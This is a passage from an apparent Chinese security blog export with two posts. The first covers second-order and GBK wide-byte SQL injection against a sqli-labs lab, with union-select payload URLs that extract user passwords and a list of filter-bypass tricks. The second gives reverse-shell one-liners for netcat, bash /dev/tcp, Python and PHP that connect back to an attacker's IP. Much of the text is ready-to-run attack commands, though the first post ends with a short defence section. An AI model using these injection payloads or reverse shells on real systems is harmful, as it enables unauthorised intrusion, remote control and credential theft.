"Make sure New Password and Retype Password fields have same value"; header('refresh:2, url=index.php'); &#125;&#125; 通过源码我们可以看到$username是直接从session中读取的，并且没有进行参数的转义处理。curr_pass和re_pass经过了函数mysql_real_escape_string转义处理。因此我们可以直接控制username这个变量进行相关注入操作。 用户注册成功后，会将用户的基本信息写入到数据库中存储，如下图所示： 前面我们提到mysql_real_escape_string函数可以将字符串转义直接写入到数据库中存储。 并且由源码我们知道修改密码的SQL代码为： 1$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "; username变量是直接读取数据库的内容，并且没有经过转义。 这边的思路是，可以直接构造一个test’#用户，新建此用户，再登录进行二次用户调用修改密码的时候，原SQL语句变为: 1$sql = "UPDATE users SET PASSWORD='$pass' where username='test'#' and password='$curr_pass' "; 由于#号注释掉了后面的语句，所以，我们本来修改的test’#的密码，但实际上修改了test的密码，而且test’#当前密码可以任意输入。 创建test’#用户 用户名test’# 密码88888 创建完成后，正常登陆 查看数据，发现用户test’#已被成功写入数据库，如下图所示： 修改当前用户密码 修改当前用户新密码为66666，并且用户的当前密码为888888，此处可以输入任意的密码为222222，可以正常修改密码，如下图所示： 查看数据库，发现test用户被正常修改，如下图所示： 由此就是整个二次注入的利用过程，这边我门只要相应的构造管理员的用户名就可以任意修改管理员账户的用户名和密码。 ​ 5.3 宽字节注入5.3.1 宽字节注入的概念 宽字节是相对于ascii这样的单字节而言的；像GB2312、GBK、GB18030、BIG5、Shift_IIS等这些都是常说的宽字节，实际上只有两个字节 GBK是一种多字符编码，通常来说，一个gbk编码汉字、占用2个字节。一个utf-8编码的汉字，占用3个字节 5.3.2 宽字节注入的原理GBK 占用两字节，ASCII占用一字节 PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。 大家都知道%df’被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\‘，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。 5.3.3 宽字节注入前提条件简单理解: ​ 数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入 深入讲解： ​ 要有宽字节注入漏洞，首先要满足数据库后端使用双/多字节解析SQL语句，其次还要保证在该种字符集范围中包含低字节位是 0x5C(01011100) 的字符，初步的测试结果 Big5 和 GBK 字符集都是有的， UTF-8 和 GB2312 没有这种字符（也就不存在宽字节注入）。 5.3.4 宽字节注入的利用测试页面存在注入点 首先我们用常规测试方法带入单引号，判断当前页面是否存在注入。如下图所示： 通过图片我们发现当前页面数据回显结果是正常的，下面提示信息我们看到，原来我们带入的单引号被增加一反斜杠转义了，所以导致我们的单引号带入失效。这边我们可以联想到源码中可能用了addslashes函数等我们带入的特殊字符进行了转义。 查看源码 1234567891011121314151617181920212223function check_addslashes($string)&#123; $string = addslashes($string); return $string;&#125;// take the variables if(isset($_GET['id']))&#123;$id=check_addslashes($_GET['id']);//echo "The filtered request is :" .$id . "&lt;br&gt;";//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id."\n");fclose($fp);// connectivity mysql_query("SET NAMES gbk");$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";$result=mysql_query($sql);$row = mysql_fetch_array($result); 通过源码我们看到mysql设置了gbk的编码方式，这边我们想到宽字节注入。 1http://192.168.31.220:8080/Less-32/?id=1%df' 我们发现此时页面报错，这是php使用addslashes函数将%df’中的单引号转义，形成%df\&#39;。mysql的gbk编码把%df\认为是一个汉字，此时单引号就成功逃逸出来，产生了注入。后面使用常见的联合注入即可。 猜解数据名 首先使用order by函数判断当前库的字段数量 1http://192.168.31.220:8080/Less-32/?id=-1%df' order by 4--+ 带入参数4时，数据库报错。判断当前字段数量为4 1http://192.168.31.220:8080/Less-32/?id=-1%df' union select 1,database(),3--+ 获取到当前数据库的名称为security 猜解库中的表名 1http://192.168.31.220:8080/Less-32/?id=-1%df' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ 获取当前库下的表名为emails,referers,uagents,users 猜解users表中的字段名 1http://192.168.31.220:8080/Less-32/?id=-1%df' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x27736563757269747927 and table_name=0x27757365727327--+ 获取字段内容 1http://192.168.31.220:8080/Less-32/?id=-1%df' union select 1,group_concat(username,password),3 from users--+ 六、常见SQL注入的绕过姿势与技巧6.1 /**/绕过空格过滤两个空格代替一个空格，用Tab代替空格，%a0=空格： 1%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/ 最基本的绕过方法，用注释替换空格： 1/* 注释 */ 示例：我们将payload中的空格都用/**/替换也可正常注入 1http://192.168.31.220:8080/Less-2/?id=-1/**/union/**/select/**/1,database(),3 6.2 使用十六进制绕过引号过滤将含有引号的字符串经过16进制加密即可。示例使用宽字节注入进行演示即可。 6.3逗号绕过(使用from或者offset)在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。 对于substr()和mid()这两个方法可以使用from to的方式来解决： 12select substr(database(),1,1) #等价于select substr(database()from 1 for 1) 使用join 12select * from users union select 1,2,3 limit 14,2 #等价于select * from users union select * from (select 1)a join (select 2)b join (select 3)c limit 14,2 使用like 123select ascii(mid(user(),1,1))=114 #等价于select user() like 'r%' 对于limit可以使用offset来绕过： 12select * from users limit 0,1 #等价于select * from users limit 1 offset 0 6.4 比较符号&lt;&gt;过滤绕过同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 使用greatest()、least() (前者返回最大值、后者返回最小值) 最常见的一个盲注的sql语句： 12select ascii(substr(user(),1,1)) &gt; 100 #等价于select greatest(ascii(substr(user(),1,1)),100)=100 6.5or and xor not绕过1and=&amp;&amp; or=|| xor=| not=! 6.7 =绕过使用like 、rlike 、regexp或者 使用&lt; 或者 &gt; 6.8 绕过union、select、where1) 使用注释符绕过 1//，-- , /**/, #, --+, -- -, ;,%00,--a 1U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user #用法 2) 使用大小写绕过 1id=-1'UnIoN/**/SeLeCT 3）使用内联注释绕过 1id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()# 4）双写绕过 1id=-1'UNIunionONSeLselectECT1,2,3–- 6.9 通用编码绕过​ URLencode、ASCII、hex、unicode等 1http://192.168.55.102:8080/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'--+ URLencode 1http://192.168.55.102:8080/Less-1/?id=-1%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%63%6f%6c%75%6d%6e%5f%6e%61%6d%65%29%20%66%72%6f%6d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%63%6f%6c%75%6d%6e%73%20%77%68%65%72%65%20%74%61%62%6c%65%5f%73%63%68%65%6d%61%3d%27%73%65%63%75%72%69%74%79%27%20%61%6e%64%20%74%61%62%6c%65%5f%6e%61%6d%65%3d%27%75%73%65%72%73%27--+ 6.10 等价函数绕过123456789101112hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir()举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 或者：substr((select 'password'),1,1) = 0x70strcmp(left('password',1), 0x69) = 1strcmp(left('password',1), 0x70) = 0strcmp(left('password',1), 0x71) = -1 七、SQL注入的防御手段7.1 安全编码​ 安全编码不难，真正困难的是如何做到全面安全，这需要良好的程序设计以及编码习惯。支离破碎的设计与随意混杂的编码难以开发出安全的系统。 ​ 各种语言与数据库的实际情况也有所区别，所以需要具体问题具体分析。 1、输入验证 ​ •数字型的输入必须是合法的数字； ​ •字符型的输入中对’进行特殊处理； ​ •验证所有的输入点，包括Get，Post，Cookie以及其他HTTP头； 2.使用符合规范的数据库访问语句 ​ •正确使用静态查询语句，如PreparedStatement 7.2 PHP(magic_quotes_gpc)​ 高版本PHP缺省设置magic_quotes_gpc为打开，这样一切get,post,cookie中的’，’’，\，null都将被特殊处理为\’，\’’，\，\0，可以防范大多数字符串SQL注入以及前面提到的空字节注入。 123$magic_quotes_runtime = “on”;$url = urldecode($_REQUEST[‘url’]);$query = “INSERT INTO tbl_links (type, url) VALUES(1, ‘$url’)”; ​ 但是在上面的代码示范中，攻击者可以利用%2527绕过这项过滤。原因是服务器首先URL解码将%2527解码为%27，然后经过magic_quotes_gpc过滤时不做处理，最后在代码处又进行一次urldecode，%27被解码为’，从而绕开了PHP缺省的过滤机制。 7.3 数据库加固(最小权限原则)​ 除了在代码设计开发阶段预防SQL注入外，对数据库进行加固也能够把攻击者所能造成的损失一定范围内； 主要包括： ▪禁止将任何高权限帐户（例如sa，dba等等）用于应用程序数据库访问。更安全的方法是单独为应用创建有限访问帐户。 ▪拒绝用户访问敏感的系统存储过程，如前面示例的xp_dirtree,xp_cmdshell等等； ▪限制用户所能够访问的数据库表；]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F05%2F28%2Fnc%E5%8F%8D%E5%BC%B9shell%E8%AF%A6%E8%A7%A3.html</url>
    <content type="text"><![CDATA[layout: posttitle: nc反弹shell详解author: Mr.zhangcategories: Security date: 2019-11-30 17:30:00tags:内网渗透 概述nc为netcat，可以进行服务器端口监听，然后把服务器的一个shell反弹回来，然后可以在本地终端控制服务器终端。 Windows下正向连接：123服务器执行：nc –l –p 8888 –e cmd.exe 本地主机执行：nc –vv 服务器ip 8888 反向连接：123 服务器执行：nc –e cmd.exe 公网ip 8888​ 公网主机执行：nc –lvp 8888 Linux下方法一：​ 反弹shell命令： 1bash –i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 ​ kali端口监听： ​ nc –lvvp 8888 注：shell三种标准文件描述符： ​ 0 – stdin 代表标准输入，使用&lt;或&lt;&lt; ​ 1 – stdout 代表标准输出，使用&gt;或&gt;&gt; ​ 2 – stderr 代表标准错误输出，使用2&gt;或2&gt;&gt; ​ &gt;&amp;的含义： ​ 当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。 ​ 当&gt;&amp;后面接文件描述时，表示将前面的文件描述符重定向至后面的文件描述符 \方法二****：**** ​ 使用python反弹shell： Python –c “import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘192.168.5.100’,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([‘/bin/bash’,’-i’]);” \方法三：** ​ 使用nc工具反弹shell： ​ nc –e /bin/bash ip 7777 ​ nc –lvvp 7777 \方法四：** ​ 使用php反弹shell： ​ php- ‘exec(“/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777”)’ ​ php -r ‘$sock=fsockopen(“192.168.0.4”,7777);exec(“/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3”);’]]></content>
  </entry>
</search>
